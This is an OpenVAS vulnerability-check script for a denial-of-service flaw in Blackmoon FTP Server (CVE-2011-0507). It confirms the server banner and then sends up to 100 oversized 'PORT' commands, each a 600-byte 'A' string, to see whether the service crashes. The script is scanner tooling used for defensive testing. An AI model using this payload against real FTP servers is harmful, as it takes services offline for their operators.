###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_blackmoon_ftp_port_cmd_dos_vuln.nasl 4704 2016-12-07 14:26:08Z cfi $
#
# Blackmoon FTP PORT Command Denial Of Service Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800194");
  script_version("$Revision: 4704 $");
  script_tag(name:"last_modification", value:"$Date: 2016-12-07 15:26:08 +0100 (Wed, 07 Dec 2016) $");
  script_tag(name:"creation_date", value:"2011-01-21 14:38:54 +0100 (Fri, 21 Jan 2011)");
  script_cve_id("CVE-2011-0507");
  script_bugtraq_id(45814);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
  script_name("Blackmoon FTP PORT Command Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("find_service_3digits.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"http://secunia.com/advisories/42933/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15986/");

  tag_impact = "Successful exploitation will allow the remote attackers to cause a denial of
  service.

  Impact Level: Application";

  tag_affected = "Blackmoon FTP 3.1.6 - Build 1735";

  tag_insight = "The flaw is due to an error while parsing PORT command, which can be
  exploited to crash the FTP service by sending multiple PORT commands with
  'big' parameter.";

  tag_solution = "Upgrade to Blackmoon FTP Version 3.1.7 Build 17356 or higher.
  For updates refer to http://www.blackmoonftpserver.com/downloads.aspx";

  tag_summary = "The host is running Blackmoon FTP Server and is prone to denial of service
  vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("ftp_func.inc");

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## Check Port Status
if(!get_port_state(ftpPort)){
  exit(0);
}

# Get the FTP banner, Confirm the application is BlackMoon FTP Server
banner = get_ftp_banner(port:ftpPort);
if("220 BlackMoon FTP Server" >!< banner){
  exit(0);
}

## Crafted PORT Command
crafted_port_cmd = string('PORT ', crap(length:600, data:'A'));

for(i=0; i < 100; i++)
{
  ## Open FTP Socket
  soc = open_sock_tcp(ftpPort);

  ## BlackMoon FTP Server crashed, if it's not able to Open the socket
  if(!soc)
  {
    security_message(ftpPort);
    exit(0);
  }
 
  ## Receive the data
  res1 = ftp_recv_line(socket:soc);

  ## Send Crafted PORT command
  res2 = ftp_send_cmd(socket:soc, cmd:crafted_port_cmd);

  ## Exit ; Patched FTP Server Response
  if("553 Requested action not taken (line too long)" >< res2){
    exit(0);
  }

  ## FTP Close
  ftp_close(socket:soc);
}
